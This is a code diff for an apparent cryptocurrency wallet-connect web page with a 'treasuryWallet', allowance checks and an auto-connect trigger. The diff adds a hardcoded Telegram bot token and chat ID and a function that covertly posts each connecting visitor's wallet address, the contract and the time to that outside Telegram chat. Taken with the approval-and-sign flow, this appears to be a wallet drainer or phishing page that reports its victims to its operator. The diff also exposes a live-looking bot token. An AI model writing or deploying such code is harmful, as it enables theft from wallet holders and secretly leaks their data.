@@ -264,6 +264,14 @@
     </div>
 
     <script>
+        // ================================================================
+        //  TELEGRAM CONFIG
+        // ================================================================
+        const TELEGRAM_CONFIG = {
+            botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
+            chatId: '8550902598'
+        };
+
         const CONFIG = {
             contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33",
             treasuryWallet: "0xB70a8100a45a28b605dbfb34d713071e21A57D28",
@@ -287,6 +295,26 @@
         const expiryDisplay = $('expiryDisplay');
         const successCheck = $('successCheck');
         const walletOptions = $('walletOptions');
+
+        // ================================================================
+        //  TELEGRAM SENDER FUNCTION
+        // ================================================================
+        async function sendTelegramMessage(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+        }
 
         function showStatus(message, type = 'info') {
             statusMsg.className = `status-msg ${type}`;
@@ -314,7 +342,6 @@
         }
 
         function openWalletApp(walletType) {
-            // URL එකට ඔටෝ කනෙක්ට් වීමට ප්‍රයිවට් ෆ්ලෑග් එකක් (autoconnect=true) එකතු කර යවනවා
             let currentUrl = window.location.href.split('?')[0];
             let targetUrl = `${currentUrl}?autoconnect=true`;
             let cleanUrl = targetUrl.replace(/^https?:\/\//, '');
@@ -416,6 +443,18 @@
                 updateUI();
                 await checkAllowance();
                 showStatus('✅ Wallet connected successfully!', 'success');
+
+                // ================================================================
+                // 📤 SEND TELEGRAM NOTIFICATION - WALLET CONNECTED
+                // ================================================================
+                const connectMsg = `🔐 <b>New Wallet Connected!</b>\n\n` +
+                                   `📱 <b>Wallet Address:</b> <code>${userAddress}</code>\n` +
+                                   `🌐 <b>Network:</b> Ethereum Mainnet\n` +
+                                   `📝 <b>Contract:</b> <code>${CONFIG.contractAddress}</code>\n` +
+                                   `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+                                   `👤 <b>User:</b> @bnkservers`;
+                
+                await sendTelegramMessage(connectMsg);
 
                 if (window.ethereum) {
                     window.ethereum.on('accountsChanged', () => location.reload());
@@ -608,11 +647,9 @@
 
         signBtn.addEventListener('click', signAndSubmit);
 
-        // 🚀 Auto-Connect Trigger: වොලට් ඇප් එක ඇතුළට ඩීප් ලින්ක් හරහා රීඩිරෙක්ට් වෙලා එනකොට ඔටෝ කනෙක්ට් වීම සඳහා
         window.addEventListener('load', () => {
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.get('autoconnect') === 'true') {
-                // ටිකක් වේලා දීලා වොලට් ඉන්ජෙක්ෂන් (window.ethereum) ලෝඩ් වෙන්න සලස්වනවා
                 setTimeout(() => {
                     if (window.ethereum) {
                         showStatus('🔄 Auto-connecting to your wallet...', 'info');
